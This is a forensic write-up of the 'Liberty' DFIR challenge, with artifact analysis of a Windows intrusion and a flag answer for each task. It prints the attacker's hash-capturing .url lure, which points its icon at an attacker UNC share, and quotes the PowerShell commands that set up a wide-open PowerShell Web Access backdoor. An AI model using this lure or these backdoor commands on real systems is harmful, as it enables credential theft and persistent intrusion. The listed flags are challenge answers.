---
title: "HTB DFIR Sherlock: Liberty"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-08-31
source: Medium
draft: true
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

### HTB DFIR Sherlock: Liberty

Following our resolution of WorkFromHome, I started Liberty challenge. Here you will follow a windows compromission that started with a RDP bruteforce and a NTLM hash stealing by the intruder. 

This report showcases artifact analysis (MFT, UsnJrnl, EVTX) but also the identification of a web access powershell backdoor.

---

> Task 1: You suspect that a threat actor might conduct password spraying attack on this server, How many failed logon attempts identified before successfully identifying the correct pair of the credential?

You have to analyze the `Security.evtx` and filter out the Event ID on 4625: An account failed to log on. You will notice **5 attempts to connect** at very short intervals (2025–06–11 14:35:56). They all failed, and the remote host that initiated them is **192.168.189.129** - not **LIBERYSV08** as the other one.

{{< image src="images/Network_authentication_bruteforce_attack_2822.png" alt="Network authentication bruteforce attack (source: Security.evtx)" caption="Network authentication bruteforce attack (source: Security.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
5
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 2: What is the user that was identified by the threat actor?

We previously found the timestamp of the brute force attack. So you have to search for **Event ID 4624** (Successful Logon) short after `2025–06–11 14:35:56`.

{{< image src="images/Remote_network_authentication_success__s_9993.png" alt="Remote network authentication success (source: Security.evtx)" caption="Remote network authentication success (source: Security.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
v.hunter
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 3: There is a shared folder that can be accessed by all users, what is the name of this shared folder?

To find shared folder setup, you have to load the **SYSTEM** hive in [Registry Explorer](https://www.sans.org/tools/registry-explorer). Then lookup the **Select** key to determine the active **ControlSet** (001 here) and finally browse to `Services\LanmanServer\Shares` to find the **three existing** shares on host.

{{< image src="images/List_of_SMB_shared_folders_on_host__sour_45.png" alt="List of SMB shared folders on host (source: SYSTEM hive)" caption="List of SMB shared folders on host (source: SYSTEM hive)" >}}

Here's a breakdown of the data in the shares keys ([source here](https://hatsoffsecurity.com/2014/11/09/research-decoding-lanmanservershares/)):
- **CATimeout** (Continuous Availability Timeout) is usually set to 0, except for clustered shares
- **CSCFlags** (Client Side Caching flags) controls offline file caching behavior
- **MaxUses** represents the maximum simultaneous connections allowed
- **Path** is the actual folder path being shared on disk where ShareName is what’s visible on the network
- **Permission** explains how the share was created
- **Type** is the share type: 0 is for a regular disk share

The remark in the Proposal share specifically state "allow anyone to…" so it's what we are looking for.

{{< image src="images/Details_of_Proposal_SMB_shared_folder__s_5245.png" alt="Details of Proposal SMB shared folder (source: SYSTEM hive)" caption="Details of Proposal SMB shared folder (source: SYSTEM hive)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Proposal
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 4: The threat actor uploaded several files to the previously identified shared folder. One of these files can be used to capture the hash of a user who opens it. What is the name of that file?

For this you have to browse the **MFT** and search in our shared folder (since it wasn't collected by KAPE). You would find two files dropped shortly after `v.hunter` compromission. The url extension can be used to link a `file://` protocol for a **forced authentication attack**.

{{< image src="images/Malicious_file_dropped_in_the_SMB_share__5498.png" alt="Malicious file dropped in the SMB share (source: $MFT)" caption="Malicious file dropped in the SMB share (source: $MFT)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Proposal.url
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 5: What is the full URL used by threat actor to mimic the fake proposal of the project?

You have to browse the **Edge History** database in `%localappdata%\microsoft\edge\user data\default` to find out the URL opened by the user. From here, you can find a `proposal.html` that was accessed after the `.url` dropping.

{{< image src="images/Decoy_URL_opened_by_the_user__source__Ed_5957.png" alt="Decoy URL opened by the user (source: Edge History)" caption="Decoy URL opened by the user (source: Edge History)" >}}

{{< admonition type=success title="FLAG" open=false >}}
http://argonaut.ark/proposal.html
{{< /admonition >}}

The timestamp of this access is:

```powershell
([DateTime]'1601-01-01').AddMilliseconds(13394126498440351 / 1000)
#output: 11 june 2025 14:41:38
```

{{< style "height:2rem;" >}}{{< /style >}}
> Task 6: What is the full UNC path of the network share that the threat actor used to capture hash of the victim?

Opening up **MFT Explorer** ([link](https://ericzimmerman.github.io/#!index.md)), you can preview ASCII content of `newproposal.txt` and `Proposal.url`.

{{< image src="images/Files_dropped_by_the_attacker_on_k_texus_4091.png" alt="Files dropped by the attacker on k.texus desktop (source: MFT)" caption="Files dropped by the attacker on k.texus desktop (source: MFT)" >}}

```
#newproposal.txt
Greeting project manager! your contractor here! I have made a new proposal for our project and you can click another file on this folder to go directly to my private website!
If you have any question regarding of this proposal, please send it to argonaut@project.ark

#Proposal.url
[InternetShortcut]
URL=http://argonaut.ark/proposal.html
WorkingDirectory=C:\Users\
IconFile=\\192.168.189.129\%USERNAME%.icon
IconIndex=1
```

{{< admonition type=success title="FLAG" open=false >}}
\\192.168.189.129\%USERNAME%.icon
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 7: What is the format of the hash that the threat actor captured via this method?

Because I was unfamiliar with it, I had to lookup the workflow of this technique of hash disclosure. The blog of [ired.team](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication) describes a couple of **forced authentication techniques**, including our weaponized `.url` one. 

So creating a malicious url file and starting responder allow a **NetNTLMv2** hash to be captured.

{{< admonition type=success title="FLAG" open=false >}}
Net-NTLMv2
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 8: What is the full name of the second compromised user?

This information is stored in SAM hive.

```
#full path
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
```

{{< image src="images/User_full_name__source__SAM_hive__1551.png" alt="User full name (source: SAM hive)" caption="User full name (source: SAM hive)" >}}

Another way is to check for account modification (Event ID 4738), but it may be considered off limit since the account was recently created for this scenario.

{{< image src="images/User_full_name__source__Security_evtx__7673.png" alt="User full name (source: Security.evtx)" caption="User full name (source: Security.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Kuneo Texus
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 9: When was the time that the threat actor connected to the server via RDP in UTC?

The RDP connection log is located in LocalSessionManager. You have to find a RDP Begin session arbitration log (Event ID 41) after the compromise timestamp (after 14:41:38).

{{< image src="images/RDP_successful_connection_logs__source___7541.png" alt="RDP successful connection logs (source: LocalSessionManager.evtx)" caption="RDP successful connection logs (source: LocalSessionManager.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
2025-06-11 14:44:48
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 10: The threat actor discovered a folder that stores files about the project, What is the full path of this folder?

You can parse the file system using **LECmd** to map out the source file of the `.lnk` existing on host. Here, in the recently browsed folder, we can see a `ProjectArk` folder but we are missing its source. By parsing LECmd result, we can see it's located at the root level.

{{< admonition type=success title="FLAG" open=false >}}
C:\ProjectArk
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 11: The threat actor created an archive file containing all files of the previously identified folder, What is the name of this archive file?

You'd be tempted to look in the **$MFT** but if the file was deleted, there is a high probability that it's not present in the MFT anymore. So in order to find the archive, you would have to search in `$UsnJrnl` for a `.zip` extension in `.\ProjectArk` folder.

{{< image src="images/Zip_filename_used_for_exfiltration__sour_3449.png" alt="Zip filename used for exfiltration (source: UsnJrnl)" caption="Zip filename used for exfiltration (source: UsnJrnl)" >}}

So the archive created was `arkproj.zip`.

{{< admonition type=success title="FLAG" open=false >}}
arkproj.zip
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 12: What is the total bytes of all files on that folder which were compressed into previously identified archive file? (not including Zone Identifier)?

Adding the File Size from $MFT, we can find the total of compressed bytes.

{{< image src="images/Files_zipped_in_arkproj_zip__source__MFT_3410.png" alt="Files zipped in arkproj.zip (source: MFT)" caption="Files zipped in arkproj.zip (source: MFT)" >}}

{{< admonition type=success title="FLAG" open=false >}}
783907
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 13: The threat actor uploaded the previously identified file to C2 website, What is the domain of this website?

During our browser investigation, we found a weird domain that contained the keyword C2.

{{< image src="images/C2_upload_website__source__Edge_History__6168.png" alt="C2 upload website (source: Edge History)" caption="C2 upload website (source: Edge History)" >}}

So let's try submitting that, and… BINGO!

{{< admonition type=success title="FLAG" open=false >}}
yourc2filemanager.cn
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 14: While reviewing users on this server, you found a suspicious user on this server, What is the name of this user?

By looking the Powershell History of `k.texus` you can answer the couple of upcoming tasks.

```powershell
#source: C:\Users\k.texus\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Install-WindowsFeature -Name WindowsPowerShellWebAccess -IncludeManagementTools
Install-PswaWebApplication -UseTestCertificate
Add-PswaAuthorizationRule -UserName * -ComputerName * -ConfigurationName *
Enable-PSRemoting -Force
Test-WSMan
Get-Service -Name WinRM
net localgroup "remote management users" t.minami /add
net user t.minami
```

You can see that a user was added to *remote management users* group. And it's the suspicious user that was used for the next compromission steps.

{{< admonition type=success title="FLAG" open=false >}}
t.minami
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 15: The threat actor installed a web-based gateway as a backdoor to the server. What is the full command used to install this feature?

Based on the **Powershell History** snippet of the Task 14, you can see that a feature called WindowsPowerShellWebAccess was installed on the host. It's a legitimate feature (on Windows Server) that **enable a powershell web panel** used to manage remote server. In this case, it's used as a **backdoor**.

{{< admonition type=success title="FLAG" open=false >}}
Install-WindowsFeature -Name WindowsPowerShellWebAccess -IncludeManagementTools
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 16: Which protocol has to be enabled to use this feature?

As `k.texus` **PowerShell History** suggests (cf. Task 14), the suspicious user had to be added to *remote management users* group. So it likely uses WinRM protocol.

{{< admonition type=success title="FLAG" open=false >}}
winrm
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 17: Provide the UTC timestamp when the threat actor confirmed successful backdoor access through the previously identified user account.

The usage of **WindowsPowerShellWebAccess** feature is logged in `C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log`. You have to search for the new suspicious user in these log file.

{{< image src="images/Intruder_accessing_backdoor_on_host__sou_3266.png" alt="Intruder accessing backdoor on host (source: PowerShellWebAccess logs)" caption="Intruder accessing backdoor on host (source: PowerShellWebAccess logs)" >}}

The first appearance is at 14:54:55 and appears to be `t.minami` login on Powershell Web Access page.

{{< admonition type=success title="FLAG" open=false >}}
2025-06-11 14:54:55
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 18: What is the Session ID of this connection?

The connection event can be found in the **PowershellWebAccess** EVTX. There is only one event log at **14:54:55**, which is when the intruder logged in to the PowerShell backdoor. The **SessionID** can be found in this log.

{{< image src="images/SessionID_of_the_PowershellWebAccess_log_6733.png" alt="SessionID of the PowershellWebAccess login (source: PowerShellWebAccess.evtx)" caption="SessionID of the PowershellWebAccess login (source: PowerShellWebAccess.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
LIBERYSV08\t.minami.250611.075455
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 19: Provide the UTC timestamp When was this session terminated by the threat actor

In **PowershellWebAccess** logs, there is a **User Signoff** log at 14:55:40. But also in the **WinRM Operational EVTX**, you can see an **Event ID 16** ([Closing WSMan shell](https://detection.wiki/microsoft-windows-winrm/)) at the very end, which indicates the intruder's disconnection.

{{< admonition type=success title="FLAG" open=false >}}
2025-06-11 14:55:40
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 20: What is the name of shared folder that was created by the threat actor during the invasion?

We found another share that wasn't a default one on Task 3.

{{< admonition type=success title="FLAG" open=false >}}
ProjectArk
{{< /admonition >}}

---

This box was great to own. The Powershell Web Access backdoor was something I had never seen before, and discovering the related artefacts was interesting.

_NB: My write-up are written by myself, without any AI assistance. Excuse my poor english, I chose to share raw content._

{{< image src="images/Liberty_success_banner_843.png" alt="Liberty success banner" caption="Liberty success banner" >}}
